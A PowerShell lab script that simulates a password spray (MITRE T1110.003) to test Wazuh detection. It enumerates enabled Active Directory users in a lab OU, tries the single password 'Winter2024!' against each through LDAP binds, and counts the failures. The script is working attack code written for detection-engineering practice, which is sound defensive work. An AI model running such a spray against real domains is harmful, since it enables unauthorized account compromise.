<#
.SYNOPSIS
    Simulate a password spray attack (MITRE ATT&CK T1110.003).
.DESCRIPTION
    Attempts a single common password against multiple domain accounts.
    Unlike brute force, password spray uses one password per account to
    avoid account lockout policies. Generates multiple EventID 4625 failures
    which triggers Wazuh rule 100002 (10+ failures from same source in 60s).
.TARGET
    Run from wkstn01 or dc01.
.MITRE
    T1110.003 — Brute Force: Password Spraying
.DETECTION
    EventID: 4625 (Failed logon)
    Indicator: Multiple failures across different accounts from same source IP
    Wazuh Rule: 100002
.CLEANUP
    No persistent changes. Ensure no accounts get locked out (use low count).
#>

#Requires -Version 5.1

Write-Host "=== Password Spray Simulation (T1110.003) ===" -ForegroundColor Red
Write-Host "WARNING: Run this only in your isolated lab environment." -ForegroundColor Yellow
Write-Host ""

# ============================================================
# CONFIGURATION — adjust spray parameters
# ============================================================
$SprayPassword = "Winter2024!"       # Common weak password to spray
$MaxAccounts   = 15                  # Number of accounts to target (keep low)
$DelaySeconds  = 1                   # Delay between attempts (seconds)
$DomainDC      = "192.168.56.10"    # dc01
# ============================================================

# Get a sample of domain user accounts to spray
Write-Host "[*] Enumerating target accounts..." -ForegroundColor Cyan
$TargetAccounts = Get-ADUser -Filter {Enabled -eq $true} `
    -SearchBase "OU=Tier2,DC=corp,DC=techcorp,DC=internal" |
    Select-Object -First $MaxAccounts -ExpandProperty SamAccountName

Write-Host "[+] Targeting $($TargetAccounts.Count) accounts." -ForegroundColor Green

# Spray each account with the common password
$FailCount = 0
foreach ($User in $TargetAccounts) {
    $UPN = "$User@corp.techcorp.internal"
    try {
        # Attempt LDAP bind — will generate EventID 4625 on failure
        $Ldap = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$DomainDC",
            $UPN,
            $SprayPassword
        )
        $Name = $Ldap.Name  # Forces authentication attempt
        Write-Host "[!] SUCCESS: $User authenticated with spray password!" -ForegroundColor Magenta
    } catch {
        Write-Host "[-] Failed: $User" -ForegroundColor DarkGray
        $FailCount++
    }
    Start-Sleep -Seconds $DelaySeconds
}

Write-Host "`n[*] Spray complete. $FailCount/$($TargetAccounts.Count) accounts failed (expected)." -ForegroundColor Cyan
Write-Host "[!] Check Wazuh dashboard for EventID 4625 alerts (Rule 100002)." -ForegroundColor Yellow
Write-Host "    Filter: rule.id:100002 or win.system.eventID:4625" -ForegroundColor DarkGray
